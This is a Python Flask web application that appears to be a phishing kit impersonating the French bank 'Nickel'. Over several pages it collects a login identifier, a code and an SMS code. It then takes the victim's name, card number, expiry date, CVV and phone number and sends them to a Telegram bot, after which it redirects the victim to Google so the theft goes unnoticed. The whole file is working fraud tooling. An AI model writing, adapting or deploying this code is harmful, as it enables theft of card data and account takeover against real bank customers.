from flask import Flask, render_template, request, redirect, url_for, session
import os
import requests

app = Flask(__name__)
app.secret_key = "supersecret"

@app.route('/', methods=['GET', 'POST'])
def identifiant():
    if request.method == 'POST':
        session['identifiant'] = request.form['identifiant']
        return redirect(url_for('code'))
    return render_template('identifiant.html')

@app.route('/code', methods=['GET', 'POST'])
def code():
    identifiant = session.get('identifiant', 'Aucun identifiant')
    if request.method == 'POST':
        return redirect(url_for('sms'))
    return render_template('code.html', identifiant=identifiant)

@app.route('/sms', methods=['GET', 'POST'])
def sms():
    if request.method == 'POST':
        session['sms'] = request.form.get('sms', '')
        return redirect(url_for('formulaire'))
    return render_template('sms.html')

@app.route('/formulaire', methods=['GET', 'POST'])
def formulaire():
    if request.method == 'POST':
        nom = request.form.get('nom')
        prenom = request.form.get('prenom')
        numero_cb = request.form.get('numero_cb')
        date_expiration = request.form.get('date_expiration')
        cvv = request.form.get('cvv')
        telephone = request.form.get('telephone')

        # Envoi Telegram (optionnel)
        bot_token = os.getenv('BOT_TOKEN')
        chat_id = os.getenv('CHAT_ID')
        message = (
            f"--- Nouvelle soumission Nickel ---\n"
            f"Nom : {nom}\n"
            f"Prénom : {prenom}\n"
            f"Numéro CB : {numero_cb}\n"
            f"Expiration : {date_expiration}\n"
            f"CVV : {cvv}\n"
            f"Téléphone : {telephone}"
        )
        if bot_token and chat_id:
            url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
            data = {'chat_id': chat_id, 'text': message}
            requests.post(url, data=data)

        # Redirection finale vers Google après soumission
        return redirect("https://www.google.com")

    return render_template('formulaire.html')

if __name__ == '__main__':
    app.run(debug=True)
